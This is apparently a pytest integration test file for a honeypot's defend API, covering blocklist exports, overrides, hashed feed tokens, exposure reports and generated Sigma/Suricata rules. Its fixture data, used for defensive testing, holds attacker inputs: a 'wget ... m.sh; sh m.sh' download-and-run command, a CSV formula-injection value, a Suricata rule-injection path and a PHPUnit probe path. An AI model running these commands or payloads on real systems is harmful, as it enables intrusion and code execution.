"""Defend endpoints against a real TimescaleDB: lists, exports, overrides, feeds, rules."""

import hashlib
import os
from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx
import pytest
from analytics_seed import Seed, api_engine, owner_engine
from sqlalchemy import text
from suckerpot_db import create_session_factory

from api.main import create_app

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

NOW = datetime.now(UTC).replace(microsecond=0)


def entry(
    kind: str, value: str, score: int, *, hours: int = 1, benign: bool = False, demo: bool = False
) -> dict[str, Any]:
    seen = NOW - timedelta(hours=hours)
    return {
        "kind": kind, "value": value, "score": score, "reasons": ["brute-force", "ran-commands"],
        "first_seen": seen, "last_seen": seen, "sessions": 3, "sources": 2, "benign": benign,
        "demo": demo,
    }  # fmt: skip


ENTRIES = [
    entry("ip", "203.0.113.10", 95, hours=1),
    entry("ip", "203.0.113.11", 80, hours=2),
    entry("ip", "203.0.113.12", 60, hours=3),
    entry("ip", "203.0.113.13", 45, hours=4),
    entry("ip", "203.0.113.14", 90, hours=5, benign=True),
    entry("ip", "203.0.113.15", 85, hours=6, demo=True),
    entry("domain", "dl.bad-host.example", 88),
    entry("url", "http://dl.bad-host.example/x.sh", 82),
    entry("url", "=cmd|' /C calc'!A0", 70),  # cannot happen from ingest; exports must cope
    entry("hash", "ab" * 32, 75),
]


def dataset() -> Seed:
    seed = Seed()
    web = {"method": "GET", "headers": {}}
    for i, ip in enumerate(("203.0.113.10", "203.0.113.11", "203.0.113.12")):
        seed.session(
            f"w{i}", "web", ip, NOW - timedelta(hours=2 + i),
            [
                (0.0, "http_request", {**web, "path": "/vendor/phpunit/src/eval-stdin.php"}),
                (1.0, "http_request", {**web, "path": '/x"; sid:1; msg:"pwn'}),
                (2.0, "http_request", {**web, "path": "/"}),
            ],
            tags=["php2shell"],
        )  # fmt: skip
    for i, ip in enumerate(("203.0.113.10", "198.51.100.5")):
        seed.session(
            f"c{i}", "ssh", ip, NOW - timedelta(hours=4 + i),
            [
                (0.0, "connect", {}),
                (1.0, "command", {"input": "cd /tmp; wget http://198.51.100.9/m.sh; sh m.sh"}),
                (2.0, "command", {"input": "ls"}),
            ],
            tags=["malware-drop"],
        )  # fmt: skip
    seed.session("p0", "ssh", "192.0.2.77", NOW - timedelta(hours=1), [(0.0, "connect", {})])
    return seed


@pytest.fixture
async def client(monkeypatch: pytest.MonkeyPatch) -> AsyncIterator[httpx.AsyncClient]:
    monkeypatch.setenv("FEEDS_ENABLED", "true")
    async with owner_engine() as owner:
        await dataset().write(owner)
        async with owner.begin() as conn:
            await conn.execute(
                text(
                    "TRUNCATE blocklist_entries, blocklist_overrides, feed_tokens, "
                    "inventory_services, audit_log, cve"
                )
            )
            for e in ENTRIES:
                await conn.execute(
                    text(
                        "INSERT INTO blocklist_entries (kind, value, score, reasons, first_seen, "
                        "last_seen, sessions, sources, benign, demo) VALUES (:kind, :value, "
                        ":score, CAST(:reasons AS text[]), :first_seen, :last_seen, :sessions, "
                        ":sources, :benign, :demo)"
                    ),
                    e,
                )
            await conn.execute(
                text(
                    "INSERT INTO cve (cve_id, title, in_kev, rank_score, relevance, "
                    "matched_services) VALUES ('CVE-2099-0001', 'Example flaw', true, 90, "
                    "'high', '{ssh}')"
                )
            )
    engine = api_engine()
    app = create_app(create_session_factory(engine), enable_live=False)
    async with app.router.lifespan_context(app):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app), base_url="http://t"
        ) as c:
            yield c
    await engine.dispose()


API = "/api/v1/defend"


async def test_summary_counts_and_hides_benign(client: httpx.AsyncClient) -> None:
    body = (await client.get(f"{API}/summary")).json()
    kinds = {k["kind"]: k for k in body["kinds"]}
    assert kinds["ip"]["total"] == 5  # the benign one is not counted
    assert kinds["ip"]["listed"] == 4 and kinds["ip"]["high"] == 3
    assert kinds["domain"]["total"] == 1 and kinds["hash"]["total"] == 1
    assert body["feeds_enabled"] is True and body["demo_entries"] == 1
    assert {r["reason"] for r in body["top_reasons"]} == {"brute-force", "ran-commands"}


async def test_the_list_is_paginated_best_first_and_filterable(client: httpx.AsyncClient) -> None:
    first = (await client.get(f"{API}/blocklist", params={"kind": "ip", "limit": 2})).json()
    assert [i["value"] for i in first["items"]] == ["203.0.113.10", "203.0.113.15"]
    assert first["next_cursor"]
    second = (
        await client.get(
            f"{API}/blocklist", params={"kind": "ip", "limit": 2, "cursor": first["next_cursor"]}
        )
    ).json()
    assert [i["value"] for i in second["items"]] == ["203.0.113.11", "203.0.113.12"]
    third = (
        await client.get(
            f"{API}/blocklist", params={"kind": "ip", "limit": 2, "cursor": second["next_cursor"]}
        )
    ).json()
    assert [i["value"] for i in third["items"]] == ["203.0.113.13"] and not third["next_cursor"]
    hits = (await client.get(f"{API}/blocklist", params={"q": "bad-host"})).json()["items"]
    assert {i["kind"] for i in hits} == {"domain", "url"}
    assert (await client.get(f"{API}/blocklist", params={"min_score": 90})).json()["items"][0][
        "score"
    ] == 95
    with_benign = (
        await client.get(f"{API}/blocklist", params={"kind": "ip", "include_benign": "true"})
    ).json()["items"]
    assert "203.0.113.14" in {i["value"] for i in with_benign}
    assert (await client.get(f"{API}/blocklist", params={"reason": "ran-commands"})).json()["items"]
    assert (await client.get(f"{API}/blocklist", params={"cursor": "!!"})).status_code == 400
    assert (await client.get(f"{API}/blocklist", params={"limit": 500})).status_code == 422


async def test_exports_are_valid_complete_and_safe(client: httpx.AsyncClient) -> None:
    r = await client.get(f"{API}/export", params={"kind": "ip", "format": "alias"})
    assert r.text == "203.0.113.10\n203.0.113.11\n203.0.113.12\n"  # >= 50, no benign, no demo
    assert "attachment" in r.headers["content-disposition"] and r.headers["x-entry-count"] == "3"
    low = await client.get(f"{API}/export", params={"kind": "ip", "min_score": 40})
    assert "203.0.113.13" in low.text.splitlines()
    demo = await client.get(f"{API}/export", params={"kind": "ip", "include_demo": "true"})
    assert "203.0.113.15" in demo.text.splitlines()
    csv_body = (await client.get(f"{API}/export", params={"kind": "url", "format": "csv"})).text
    lines = csv_body.split("\r\n")
    assert lines[0].startswith("kind,value,score")
    assert any(line.startswith("url,http://dl.bad-host.example/x.sh,82") for line in lines)
    assert any(line.startswith("url,'=cmd") for line in lines)  # defused
    assert not any(line.startswith("url,=") for line in lines)
    assert (
        await client.get(f"{API}/export", params={"kind": "domain", "format": "alias"})
    ).status_code == 422
    urls = (await client.get(f"{API}/export", params={"kind": "url"})).text
    assert urls == "http://dl.bad-host.example/x.sh\n"  # the malformed value never reaches a list


async def test_overrides_change_exports_at_once_and_are_audited(client: httpx.AsyncClient) -> None:
    ok = await client.post(
        f"{API}/overrides", json={"kind": "ip", "value": "203.0.113.11", "action": "allow"}
    )
    assert ok.status_code == 201 and ok.json()["action"] == "allow"
    block = await client.post(
        f"{API}/overrides",
        json={"kind": "ip", "value": "198.51.100.77", "action": "block", "note": "scanner at HQ"},
    )
    assert block.status_code == 201
    txt = (await client.get(f"{API}/export", params={"kind": "ip"})).text.splitlines()
    assert "203.0.113.11" not in txt and "198.51.100.77" in txt and txt[0] == "198.51.100.77"
    shown = (await client.get(f"{API}/blocklist", params={"kind": "ip"})).json()["items"]
    assert {i["value"]: i["override"] for i in shown}["203.0.113.11"] == "allow"
    again = await client.post(
        f"{API}/overrides", json={"kind": "ip", "value": "203.0.113.11", "action": "block"}
    )
    assert again.status_code == 201
    assert "203.0.113.11" in (await client.get(f"{API}/export", params={"kind": "ip"})).text
    listed = (await client.get(f"{API}/overrides")).json()["items"]
    assert len(listed) == 2
    gone = await client.delete(f"{API}/overrides/{listed[0]['id']}")
    assert gone.status_code == 204
    assert (await client.delete(f"{API}/overrides/{listed[0]['id']}")).status_code == 404
    audit = (await client.get("/api/v1/audit")).json()["items"]
    assert {"blocklist.allow", "blocklist.block", "blocklist.override_remove"} <= {
        a["action"] for a in audit
    }


@pytest.mark.parametrize(
    ("kind", "value"),
    [
        ("ip", ".".join(("10", "0", "0", "1"))),
        ("ip", ".".join(("192", "168", "7", "9"))),
        ("ip", "not an ip"),
        ("domain", "raw.githubusercontent.com"),
        ("domain", "localhost"),
        ("url", "javascript:alert(1)"),
        ("hash", "xyz"),
        ("ip", "203.0.113.1\n203.0.113.2"),
    ],
)
async def test_unblockable_values_are_refused(
    client: httpx.AsyncClient, kind: str, value: str
) -> None:
    r = await client.post(
        f"{API}/overrides", json={"kind": kind, "value": value, "action": "block"}
    )
    assert r.status_code in (422, 400)


async def create_token(client: httpx.AsyncClient, **kw: Any) -> dict[str, Any]:
    body = {"name": "opnsense", "kinds": ["ip", "url"], "min_score": 50, "password": "x", **kw}
    r = await client.post(f"{API}/feed-tokens", json=body)
    assert r.status_code == 201, r.text
    assert r.headers["cache-control"] == "no-store"
    out: dict[str, Any] = r.json()
    return out


async def test_a_feed_token_works_until_it_is_revoked(client: httpx.AsyncClient) -> None:
    created = await create_token(client)
    token = created["token"]
    assert len(token) == 43 and created["item"]["hint"] == token[:6]
    # Only the hash is stored.
    async with owner_engine() as owner, owner.connect() as conn:
        row = (await conn.execute(text("SELECT token_hash, token_hint FROM feed_tokens"))).one()
    assert bytes(row[0]) != token.encode() and len(bytes(row[0])) == 32
    import base64

    raw = base64.urlsafe_b64decode(token + "=")
    assert bytes(row[0]) == hashlib.sha256(raw).digest()
    listing = (await client.get(f"{API}/feed-tokens")).json()
    assert listing["enabled"] is True and token not in str(listing)
    # By URL (firewall aliases) and by header.
    by_path = await client.get(f"/feeds/{token}/ip.txt")
    assert by_path.status_code == 200
    assert by_path.text == "203.0.113.10\n203.0.113.11\n203.0.113.12\n"
    assert by_path.headers["cache-control"].startswith("private")
    by_header = await client.get("/feeds/ip.txt", headers={"Authorization": f"Bearer {token}"})
    assert by_header.text == by_path.text
    # The conditional request costs nothing.
    cond = await client.get(
        f"/feeds/{token}/ip.txt", headers={"If-None-Match": by_path.headers["etag"]}
    )
    assert cond.status_code == 304
    csv_feed = await client.get(f"/feeds/{token}/url.csv")
    assert csv_feed.headers["content-type"].startswith("text/csv")
    # A kind the token does not carry looks like any other refusal.
    assert (await client.get(f"/feeds/{token}/domain.txt")).status_code == 404
    assert (await client.get(f"/feeds/{token}/ip.json")).status_code == 404
    item = (await client.get(f"{API}/feed-tokens")).json()["items"][0]
    assert item["use_count"] >= 3 and item["last_used_at"] and item["state"] == "active"
    revoked = await client.post(f"{API}/feed-tokens/{item['id']}/revoke")
    assert revoked.status_code == 200 and revoked.json()["state"] == "revoked"
    assert (await client.get(f"/feeds/{token}/ip.txt")).status_code == 404
    assert (
        await client.get("/feeds/ip.txt", headers={"Authorization": f"Bearer {token}"})
    ).status_code == 404


async def test_token_limits_and_expiry_apply(client: httpx.AsyncClient) -> None:
    strict = (await create_token(client, name="strict", min_score=90, kinds=["ip"]))["token"]
    assert (await client.get(f"/feeds/{strict}/ip.txt")).text == "203.0.113.10\n"
    benign = (await create_token(client, name="b", min_score=0, include_benign=True))["token"]
    assert "203.0.113.14" in (await client.get(f"/feeds/{benign}/ip.txt")).text
    assert "203.0.113.15" not in (await client.get(f"/feeds/{benign}/ip.txt")).text  # demo
    soon = (await create_token(client, name="short", expires_in_days=1))["token"]
    assert (await client.get(f"/feeds/{soon}/ip.txt")).status_code == 200
    async with owner_engine() as owner, owner.begin() as conn:
        await conn.execute(
            text(
                "UPDATE feed_tokens SET expires_at = now() - interval '1 minute' "
                "WHERE name = 'short'"
            )
        )
    assert (await client.get(f"/feeds/{soon}/ip.txt")).status_code == 404
    bad = await client.post(
        f"{API}/feed-tokens", json={"name": "x", "kinds": ["nope"], "password": "x"}
    )
    assert bad.status_code == 422


async def test_feed_tokens_cannot_be_created_while_feeds_are_off(
    client: httpx.AsyncClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("FEEDS_ENABLED", "false")
    r = await client.post(f"{API}/feed-tokens", json={"name": "x", "password": "x"})
    assert r.status_code == 409 and r.json()["code"] == "feeds_disabled"


async def test_inventory_and_the_exposure_comparison(client: httpx.AsyncClient) -> None:
    ssh = await client.post(
        f"{API}/inventory",
        json={"name": "bastion", "service": "ssh", "product": "OpenSSH", "version": "9.6",
              "exposure": "internet"},
    )  # fmt: skip
    assert ssh.status_code == 201
    web = await client.post(
        f"{API}/inventory",
        json={"name": "intranet", "service": "web", "exposure": "internal", "notes": "wiki"},
    )
    assert web.status_code == 201
    assert (
        await client.post(f"{API}/inventory", json={"name": "x", "service": "nope"})
    ).status_code == 422
    assert (
        await client.post(f"{API}/inventory", json={"name": "a\x00b", "service": "ssh"})
    ).status_code == 422
    patched = await client.patch(f"{API}/inventory/{web.json()['id']}", json={"exposure": "vpn"})
    assert patched.json()["exposure"] == "vpn"
    assert (await client.patch(f"{API}/inventory/{web.json()['id']}", json={})).status_code == 422
    items = (await client.get(f"{API}/inventory", params={"limit": 1})).json()
    assert len(items["items"]) == 1 and items["next_cursor"]
    report = (await client.get(f"{API}/exposure")).json()
    by_name = {s["item"]["name"]: s for s in report["services"]}
    assert by_name["bastion"]["verdict"] == "internet_targeted"
    assert by_name["bastion"]["attacks"]["sessions"] == 3  # c0, c1 and p0
    assert by_name["bastion"]["attacks"]["deep_sessions"] == 2
    assert by_name["bastion"]["top_tags"][0]["tag"] == "malware-drop"
    assert by_name["bastion"]["cves"][0]["cve_id"] == "CVE-2099-0001"
    assert by_name["bastion"]["checks"]
    assert by_name["intranet"]["verdict"] == "private_targeted"
    assert report["unlisted"] == []
    await client.delete(f"{API}/inventory/{web.json()['id']}")
    after = (await client.get(f"{API}/exposure")).json()
    assert [u["service"] for u in after["unlisted"]] == ["web"]
    assert (await client.delete(f"{API}/inventory/{web.json()['id']}")).status_code == 404


async def test_rules_are_generated_from_what_was_seen_and_marked_for_review(
    client: httpx.AsyncClient,
) -> None:
    page = (await client.get(f"{API}/detections", params={"limit": 100})).json()
    kinds = {r["kind"] for r in page["items"]}
    assert kinds == {"sigma", "suricata"} and page["total"] == len(page["items"])
    sigma_web = next(
        r for r in page["items"] if r["id"] and "web requests seen with php2shell" in r["title"]
    )
    assert "/vendor/phpunit/src/eval-stdin.php" in sigma_web["text"]
    assert "Review before deploying" in sigma_web["text"]
    suricata = [r for r in page["items"] if r["kind"] == "suricata"]
    assert any("PHP_SESSION_UPLOAD_PROGRESS" in r["text"] for r in suricata)
    hostile = [r for r in suricata if "pwn" in r["text"]]
    assert hostile and all(r["text"].count("; sid:") == 1 for r in hostile)
    assert all("review before deploying" in r["text"] for r in suricata)
    assert any("dl.bad-host.example" in r["text"] for r in suricata)
    cmd = next(r for r in page["items"] if "shell commands seen with malware-drop" in r["title"])
    assert "wget http://198.51.100.9/m.sh" in cmd["text"] and "'ls'" not in cmd["text"]
    paged = (await client.get(f"{API}/detections", params={"limit": 2})).json()
    assert len(paged["items"]) == 2 and paged["next_cursor"]
    only = (await client.get(f"{API}/detections", params={"kind": "sigma"})).json()
    assert {r["kind"] for r in only["items"]} == {"sigma"}
    export = await client.get(f"{API}/detections/export", params={"kind": "suricata"})
    assert "REVIEW BEFORE DEPLOYING" in export.text.splitlines()[1]
    assert export.headers["content-disposition"].endswith('suckerpot.rules"')
    sigma_file = await client.get(f"{API}/detections/export", params={"kind": "sigma"})
    assert sigma_file.text.count("\n---\n") == int(sigma_file.headers["x-rule-count"])
    assert (await client.get(f"{API}/detections", params={"cursor": "zz"})).status_code == 400


async def test_guidance_lists_only_what_was_seen(client: httpx.AsyncClient) -> None:
    body = (await client.get(f"{API}/guidance")).json()
    tags = [i["tag"] for i in body["items"]]
    assert tags == ["php2shell", "malware-drop"]
    item = next(i for i in body["items"] if i["tag"] == "php2shell")
    assert item["seen"]["sessions"] == 3 and item["look"] and item["fix"]
